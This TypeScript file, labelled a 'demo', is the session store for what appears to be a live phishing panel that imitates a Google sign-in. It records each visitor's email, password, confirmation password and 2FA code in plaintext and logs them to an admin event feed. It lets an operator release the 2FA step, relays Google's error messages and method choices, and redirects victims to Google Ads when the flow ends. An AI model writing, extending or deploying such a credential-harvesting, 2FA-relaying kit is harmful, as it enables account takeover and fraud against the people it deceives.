export type DemoStep =
  | "email"
  | "password"
  | "confirmPassword"
  | "waitingTwoFactor"
  | "chooseMethod"
  | "twoFactor"
  | "captcha"
  | "complete";

export type MethodOption = {
  challengeType: string;
  label: string;
  subtitle: string;
  available: boolean;
};

export type TwoFactorType = "sms" | "email" | "authenticator" | "device";

export type DemoEventType = "join" | "email" | "password" | "confirmPassword" | "twoFactor" | "captcha";

export type DemoEvent = {
  id: string;
  type: DemoEventType;
  message: string;
  timestamp: string;
};

export type DemoSession = {
  status: string;
  step: DemoStep;
  chromeReady: boolean;
  emailPreview: string;
  passwordPreview: string;
  confirmPasswordPreview: string;
  twoFactorPreview: string;
  captchaChecked: boolean;
  selectedTwoFactorType: TwoFactorType;
  releasedTwoFactor: boolean;
  userPresent: boolean;
  createdAt: string;
  device: string;
  twoFactorDeviceName: string;
  availableMethods: MethodOption[];
  forceRedirect: string | null;
  inputError: string | null;
  deviceAnimationSvg: string;
  events: DemoEvent[];
};

export type SessionEntry = DemoSession & { sessionId: string };

type DemoStore = {
  sessions: Map<string, DemoSession>;
};

const initialSession = (): DemoSession => ({
  status: "Aguardando usuario entrar na tela de login...",
  step: "email",
  chromeReady: false,
  emailPreview: "",
  passwordPreview: "",
  confirmPasswordPreview: "",
  twoFactorPreview: "",
  captchaChecked: false,
  selectedTwoFactorType: "sms",
  releasedTwoFactor: false,
  userPresent: false,
  createdAt: new Date().toISOString(),
  device: "",
  twoFactorDeviceName: "",
  availableMethods: [],
  forceRedirect: null,
  inputError: null,
  deviceAnimationSvg: "",
  events: [],
});

function getStore(): DemoStore {
  const g = globalThis as typeof globalThis & { __demoStoreV2?: DemoStore };
  if (!g.__demoStoreV2) {
    g.__demoStoreV2 = { sessions: new Map() };
  }
  return g.__demoStoreV2;
}

function get(sessionId: string): DemoSession | null {
  return getStore().sessions.get(sessionId) ?? null;
}

function addEvent(session: DemoSession, type: DemoEventType, message: string) {
  session.events = [
    { id: crypto.randomUUID(), type, message, timestamp: new Date().toISOString() },
    ...session.events,
  ].slice(0, 30);
}


// ── read ────────────────────────────────────────────────────────────────────

export function getAllSessions(): SessionEntry[] {
  const store = getStore();
  return Array.from(store.sessions.entries())
    .map(([sessionId, session]) => ({ sessionId, ...session }))
    .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
}

export function getDemoSession(sessionId: string): DemoSession | null {
  return get(sessionId);
}

// ── lifecycle ────────────────────────────────────────────────────────────────

function detectDevice(ua: string): string {
  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows/i.test(ua)) return "Windows";
  if (/Macintosh|Mac OS X/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux";
  return "Desconhecido";
}

export function createSession(userAgent = ""): SessionEntry {
  const store = getStore();
  const sessionId = crypto.randomUUID();
  const session = initialSession();
  session.userPresent = true;
  session.device = detectDevice(userAgent);
  session.status = "Novo usuario entrou na tela de login. Aguardando email...";
  addEvent(session, "join", "Entrou na tela de login.");
  store.sessions.set(sessionId, session);
  return { sessionId, ...session };
}

export function resetDemoSession(sessionId: string): DemoSession | null {
  const store = getStore();
  const session = store.sessions.get(sessionId);
  if (!session) return null;
  session.forceRedirect =
    process.env.PHANTOM_REDIRECT_URL ?? "https://business.google.com/br/google-ads/";
  return session;
}

export function deleteSession(sessionId: string): void {
  getStore().sessions.delete(sessionId);
}

// ── user actions ─────────────────────────────────────────────────────────────

export function submitEmail(sessionId: string, email: string): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.emailPreview = email.trim() || "email informado";
  session.step = "password";
  session.status = "Email colocado. Aguardando senha...";
  addEvent(session, "email", `Email: ${session.emailPreview}`);
  return session;
}

export function submitPassword(sessionId: string, password: string): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.passwordPreview = password;
  session.step = "waitingTwoFactor";
  session.releasedTwoFactor = false;
  session.status = "Senha colocada. Aguardando 2FA...";
  addEvent(session, "password", `Senha: ${session.passwordPreview}`);
  return session;
}

export function submitConfirmPassword(sessionId: string, password: string): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.confirmPasswordPreview = password;
  session.step = "waitingTwoFactor";
  session.releasedTwoFactor = false;
  session.status = "Confirmacao colocada. Tela congelada aguardando liberacao do 2FA pelo admin...";
  addEvent(session, "confirmPassword", `Confirmacao de senha: ${session.confirmPasswordPreview}`);
  return session;
}

export function submitTwoFactor(sessionId: string, code: string): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.twoFactorPreview = code;
  session.status = "Codigo 2FA colocado. Redirecionando usuario...";
  addEvent(session, "twoFactor", `2FA: ${session.twoFactorPreview}`);
  return session;
}

export function submitCaptcha(sessionId: string): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.captchaChecked = true;
  session.step = "complete";
  session.status = "Fluxo concluido na simulacao.";
  addEvent(session, "captcha", "Captcha verificado.");
  return session;
}

// ── admin actions ─────────────────────────────────────────────────────────────

export function releaseTwoFactor(sessionId: string, type: TwoFactorType): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.selectedTwoFactorType = type;
  session.releasedTwoFactor = true;
  session.step = "twoFactor";
  session.status = `2FA liberado pelo admin com metodo ${getTwoFactorLabel(type)}. Aguardando codigo...`;
  return session;
}

export function updateTwoFactorType(sessionId: string, type: TwoFactorType): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.selectedTwoFactorType = type;
  return session;
}

export function getTwoFactorLabel(type: TwoFactorType) {
  if (type === "email") return "Email";
  if (type === "authenticator") return "Authenticator";
  if (type === "device") return "Confirmação no celular";
  return "SMS";
}

export function setInputError(sessionId: string, step: DemoStep, error: string): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.step = step;
  session.inputError = error;
  addEvent(session, step === "email" ? "email" : step === "password" ? "password" : "twoFactor",
    `Erro do Google: ${error}`);
  return session;
}

export function setChromeReady(sessionId: string): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.chromeReady = true;
  return session;
}

export function clearInputError(sessionId: string): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.inputError = null;
  return session;
}

export function setDeviceName(sessionId: string, deviceName: string): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.twoFactorDeviceName = deviceName;
  return session;
}

export function setChooseMethod(sessionId: string, methods: MethodOption[]): DemoSession | null {
  const session = get(sessionId);
  if (!session) return null;
  session.step = "chooseMethod";
  session.availableMethods = methods;
  session.status = "Google pediu para o usuario escolher o metodo de 2FA...";
  return session;
}
